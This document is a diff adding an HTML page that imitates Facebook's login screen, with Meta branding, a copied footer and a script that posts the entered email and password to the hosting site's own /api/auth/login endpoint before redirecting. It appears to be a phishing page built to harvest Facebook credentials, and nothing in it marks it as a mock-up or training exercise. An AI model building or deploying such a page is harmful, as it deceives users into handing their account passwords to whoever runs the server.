@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Facebook Login</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Segoe UI, Arial, Helvetica, sans-serif;
+}
+
+body{
+background:#f0f2f5;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+height:100vh;
+}
+
+/* TITLE */
+
+.title{
+font-size:48px;
+font-weight:900;
+color:#1877f2;
+margin-bottom:30px;
+}
+
+/* LOGIN CARD */
+
+.card{
+width:380px;
+background:white;
+padding:30px;
+border-radius:10px;
+box-shadow:0 8px 25px rgba(0,0,0,0.15);
+text-align:center;
+}
+
+/* INPUT */
+
+input{
+width:100%;
+padding:14px;
+margin-bottom:15px;
+border-radius:6px;
+border:1px solid #dddfe2;
+font-size:16px;
+}
+
+input:focus{
+outline:none;
+border-color:#1877f2;
+box-shadow:0 0 0 2px rgba(24,119,242,0.2);
+}
+
+/* LOGIN BUTTON */
+
+.login-btn{
+width:100%;
+padding:14px;
+border:none;
+border-radius:6px;
+background:#1877f2;
+color:white;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+transition:0.2s;
+}
+
+.login-btn:hover{
+background:#166fe5;
+}
+
+/* LOADING STATE */
+
+.login-btn.loading{
+background:#9bbcf5;
+cursor:not-allowed;
+}
+
+/* ERROR MESSAGE */
+
+.error{
+display:none;
+color:#d93025;
+font-size:14px;
+margin-bottom:10px;
+}
+
+/* DIVIDER */
+
+.divider{
+height:1px;
+background:#ddd;
+margin:20px 0;
+}
+
+/* CREATE ACCOUNT */
+
+.create-btn{
+width:100%;
+padding:12px;
+border:none;
+border-radius:6px;
+background:#2b49f7;
+color:white;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.create-btn:hover{
+background:#206fa4;
+}
+
+/* FOOTER */
+
+.site-footer{
+position:absolute;
+bottom:25px;
+text-align:center;
+font-size:13px;
+color:#737373;
+}
+
+.languages span,
+.links span{
+margin:0 8px;
+cursor:pointer;
+}
+
+.footer-bottom{
+position:absolute;
+bottom:5px;
+font-size:12px;
+color:#8a8d91;
+text-align:center;
+width:100%;
+}
+
+.languages{
+margin-bottom:8px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<h1 class="title">Facebook Login</h1>
+
+<div class="card">
+
+<div id="error" class="error">Login failed. Please try again.</div>
+
+<input id="email" placeholder="Email address">
+
+<input id="password" type="password" placeholder="Password">
+
+<button id="loginBtn" class="login-btn" onclick="login()">Log In</button>
+
+<div class="divider"></div>
+
+<button class="create-btn">Create new account</button>
+
+</div>
+
+<div class="site-footer">
+
+<div class="languages">
+<span>English</span>
+<span>Hausa</span>
+<span>Français</span>
+<span>Español</span>
+<span>Português</span>
+<span>العربية</span>
+</div>
+
+<div class="links">
+<span>About</span>
+<span>Privacy</span>
+<span>Terms</span>
+<span>Help</span>
+<span>Developers</span>
+<span>Careers</span>
+</div>
+
+</div>
+
+<div class="footer-bottom">
+© 2026 Meta · Privacy · Terms · Help
+</div>
+
+<script>
+
+async function login(){
+
+const email=document.getElementById("email").value
+const password=document.getElementById("password").value
+const btn=document.getElementById("loginBtn")
+const error=document.getElementById("error")
+
+error.style.display="none"
+
+btn.classList.add("loading")
+btn.innerText="Signing in..."
+
+try{
+
+const response=await fetch("/api/auth/login",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+email:email,
+password:password
+})
+
+})
+
+const data=await response.json()
+
+if(data.success){
+
+window.location.href=data.redirect
+
+}else{
+
+error.style.display="block"
+btn.classList.remove("loading")
+btn.innerText="Log In"
+
+}
+
+}catch(err){
+
+error.style.display="block"
+btn.classList.remove("loading")
+btn.innerText="Log In"
+
+}
+
+}
+
+</script>
+
+</body>
+
+</html>
